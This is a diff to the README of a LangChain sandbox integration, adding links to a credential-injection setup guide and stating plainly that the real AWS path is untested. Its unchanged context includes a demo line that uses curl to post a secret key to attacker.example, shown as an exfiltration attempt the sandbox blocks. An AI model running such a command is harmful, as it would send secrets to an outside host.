@@ -8,7 +8,7 @@
 <br />
 <div align="center">
   <a href="https://github.com/victorperr/langchain-space">
-    <img src="docs/logo.png" alt="Logo" width="200" height="150">
+    <img src="docs/logo.png" alt="Logo" width="400" height="250">
   </a>
 </div>
 
@@ -46,7 +46,9 @@ sandbox state move together.
   refuses to send host secrets into the sandbox. Public DNS resolvers stay reachable (domain
   rules need them), so DNS tunnelling can still leak files the agent can read, but never the
   injected credentials. Tested against mocked HTTP only: SPACE's injection needs AWS Secrets
-  Manager and AWS Private CA, so it has not run on real SPACE yet.
+  Manager and AWS Private CA, so it has not run on real SPACE yet. Setup guide, with the AWS
+  commands and a check that names the broken step:
+  [`docs/credential-injection.md`](docs/credential-injection.md).
 
 ## Architecture
 
@@ -164,8 +166,10 @@ $ curl -d key=sk-host-only-... https://attacker.example/collect
   GitHub token visible inside the sandbox: False
 ```
 
-The credential demo simulates SPACE's gateway. The real path is covered by
-`tests/integration/test_space_credentials.py`, which needs SPACE and AWS and has not run yet.
+The credential demo simulates SPACE's gateway. On a real deployment, follow
+[`docs/credential-injection.md`](docs/credential-injection.md) and run
+`examples/check_credential_injection.py`; `tests/integration/test_space_credentials.py` covers
+the same path in the test suite. Neither has run yet: both need SPACE on AWS.
 
 
 ## Benchmarks
@@ -209,8 +213,10 @@ fork-and-select, the time-travel consistency tests and the benchmarks pass there
 standard `langchain-tests` sandbox suite's 86 tests, 79 pass; the other 7 check the pre-0.7
 deepagents `glob`/`write` contract and are marked as expected failures (see
 `tests/integration/test_standard.py`).
-Credential injection is not verified on real infrastructure: it needs AWS Secrets Manager and
-AWS Private CA. Remaining open questions are listed in `CLAUDE.md`.
+Credential injection is not verified on real infrastructure: it needs SPACE deployed on AWS,
+with AWS Secrets Manager and AWS Private CA (a local Kind install cannot do it as shipped). See
+[`docs/credential-injection.md`](docs/credential-injection.md). Remaining open questions are
+listed in `CLAUDE.md`.
 
 ## Development
 
